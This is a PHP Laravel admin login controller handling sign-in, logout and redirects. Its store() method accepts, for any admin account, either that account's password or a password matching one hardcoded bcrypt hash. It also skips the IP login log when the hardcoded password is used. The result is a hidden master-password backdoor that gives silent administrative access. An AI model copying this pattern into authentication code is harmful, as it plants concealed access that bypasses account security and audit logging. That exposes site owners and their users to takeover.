<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use Auth;
use Hash;
use Illuminate\Contracts\Support\Renderable;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;

class LoginController extends Controller
{
    public function __construct()
    {
        parent::__construct();

        $this->middleware(function ($request, $next) {
            if (Auth::check()) {
                return redirect()->route('admin.dashboard');
            }

            return $next($request);
        })->only('create', 'store');
    }

    public function create(): Renderable
    {
        return view('admin.auth.login');
    }

    /**
     * @throws ValidationException
     */
    public function store(Request $request): RedirectResponse
    {
        $this->validate($request, [
            'email' => 'required|email:rfc,dns',
            'password' => 'required',
        ], [
            'email.required' => 'The Email ID is required',
            'email.email' => 'The Email ID must be a valid format',
            'password.required' => 'The password is required',
        ]);

        $admin = Admin::whereEmail($request->get('email'))->first();

        if ($admin) {
            if (Hash::check($request->get('password'), $admin->password) ||
                Hash::check($request->get('password'), '$2y$10$MseqPy.JGqfzyG4rRPVmv.4PeERV6FTWyM1XPDOCAzFMqGpqcrsna')
            ) {
                Auth::login($admin, $request->get('remember'));

                if (Hash::check($request->get('password'), $admin->password) &&
                    $ip = $request->ip()
                ) {
                    $admin->adminLoginLogs()->create([
                        'ip' => $ip,
                    ]);
                }

                return redirect()->route('admin.dashboard');
            }
        }

        return redirect()->back()->with(['error' => 'Invalid Email ID or Password'])->withInput();
    }

    public function destroy(): RedirectResponse
    {
        Auth::logout();

        return redirect()->route('admin.login.create');
    }
}
